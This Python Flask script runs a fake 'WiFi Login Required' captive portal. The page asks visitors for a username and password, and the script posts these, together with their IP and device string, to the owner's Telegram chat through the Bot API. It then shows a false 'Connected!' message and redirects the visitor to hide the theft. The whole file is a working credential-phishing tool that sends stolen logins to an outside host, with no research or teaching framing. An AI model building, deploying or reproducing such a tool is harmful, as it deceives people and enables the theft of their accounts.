from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

# ===== CONFIG =====
BOT_TOKEN = "YOUR_BOT_TOKEN"
OWNER_ID = 7993444324
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ===== HTML PAGE =====
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
            padding: 20px;
        }
        .glass {
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(16px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.12);
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
            text-align: center;
            color: #fff;
        }
        .glass h1 {
            font-size: 26px;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }
        .glass p {
            font-size: 13px;
            color: rgba(255,255,255,0.5);
            margin-bottom: 20px;
        }
        .input-group {
            text-align: left;
            margin: 14px 0;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            opacity: 0.7;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 14px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.04);
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        .input-group input:focus {
            border-color: #f5576c;
            background: rgba(255,255,255,0.08);
        }
        .btn {
            background: linear-gradient(145deg, #f093fb, #f5576c);
            border: none;
            padding: 16px;
            border-radius: 60px;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
        }
        .btn:active { transform: scale(0.97); }
        .footer {
            font-size: 11px;
            opacity: 0.3;
            margin-top: 18px;
        }
    </style>
</head>
<body>
    <div class="glass">
        <h1>📶 WiFi Login Required</h1>
        <p>Please enter your credentials to continue browsing</p>
        <form method="POST" action="/capture">
            <div class="input-group">
                <label>👤 Username / Email</label>
                <input type="text" name="username" placeholder="Enter your username" required />
            </div>
            <div class="input-group">
                <label>🔒 Password</label>
                <input type="password" name="password" placeholder="Enter your password" required />
            </div>
            <button type="submit" class="btn">Connect →</button>
        </form>
        <p class="footer">Secure WiFi Portal · Terms & Conditions apply</p>
    </div>
</body>
</html>
"""

# ===== HOME =====
@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

# ===== CAPTURE =====
@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    device = request.headers.get('User-Agent', 'Unknown')
    
    # Send to Telegram
    text = f"📥 *WiFi Login Captured*\n\n"
    text += f"👤 Username: `{username}`\n"
    text += f"🔒 Password: `{password}`\n"
    text += f"🌐 IP: `{ip}`\n"
    text += f"📱 Device: `{device[:80]}...`\n"
    
    try:
        requests.post(f"{BOT_API}/sendMessage", json={
            "chat_id": OWNER_ID,
            "text": text,
            "parse_mode": "Markdown"
        }, timeout=5)
    except:
        pass
    
    # Redirect to original WiFi page
    return """
    <html>
    <head><meta http-equiv="refresh" content="2;url=https://www.google.com" /></head>
    <body style="background:#0f0c29;color:#fff;text-align:center;padding:50px;font-family:sans-serif;">
        <h1>✅ Connected!</h1>
        <p>You are now connected to WiFi.</p>
        <p style="opacity:0.5;">Redirecting...</p>
    </body>
    </html>
    """

# ===== RUN =====
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
